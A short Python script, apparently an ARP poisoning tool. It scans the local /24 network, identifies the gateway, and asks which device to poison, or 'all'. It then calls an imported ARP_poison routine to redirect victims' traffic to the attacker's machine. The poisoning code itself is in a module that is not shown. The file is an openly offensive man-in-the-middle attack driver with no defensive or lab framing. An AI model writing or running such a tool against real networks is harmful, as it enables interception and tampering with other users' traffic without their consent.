# ARP poisoner
"""

"""

from multiprocessing import Process
from scapy.all import *
import netifaces

# custom libraries
from networkScanner import Scanner
netScanner = Scanner()

from logger import DataLogging
logger = DataLogging(True)

from ARPer import ARP
arp = ARP()


def main():
    # scan the network for all the devices on the network
    logger.say(f'scanning network')
    IP = netScanner.getOwnIP()
    netMask = "24"
    type = 'ARP'
    deviceList = netScanner.scan(type, IP, netMask)

    logger.say(f'active devices: {deviceList}')


    # identify the gateway
    gws = netifaces.gateways()
    gateway = gws['default'][netifaces.AF_INET][0]

    while True:
        target = input("which of the available IP addresses would you like to poison? (I won't let you poison the gateway or yourself)\nAlternatively, type \"all\" to poison everyone")

        if target in deviceList and target != IP and target != gateway and str(target) != 'all':
            logger.say(f'poisoning {target} to connect to {IP}')
            arp.ARP_poison(target, IP, True)
            break

        elif str(target) == 'all':
            for device in deviceList:
                if device != IP and device != gateway:
                    logger.say(f'poisoning {device} to connect to {IP}')
                    arp.ARP_poison(device, IP, True)
            break

        logger.error(f"Um... {target} isn't in the list of available IP targets")



    return 1


if __name__ == "__main__":
    main()